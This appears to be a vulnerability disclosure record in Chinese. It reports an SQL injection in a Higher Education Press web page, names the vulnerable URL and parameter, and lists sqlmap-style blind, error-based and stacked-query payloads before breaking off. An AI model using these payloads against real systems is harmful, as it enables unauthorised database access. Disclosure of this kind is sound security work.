wybug_title: 高等教育出版社SQL注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2013-11-28：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-01-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 高等教育出版社SQL注入漏洞 详细说明：  1.http://hve.hep.com.cn/hep/plugin/gaozhi/test/books.jsp?resId=2388   漏洞证明：  Place: GETParameter: resId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: resId=2388 AND 6217=6217    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: resId=2388 AND 6699=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (6699=6699) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(109)+CHAR(113)))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: resId=2388; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload:
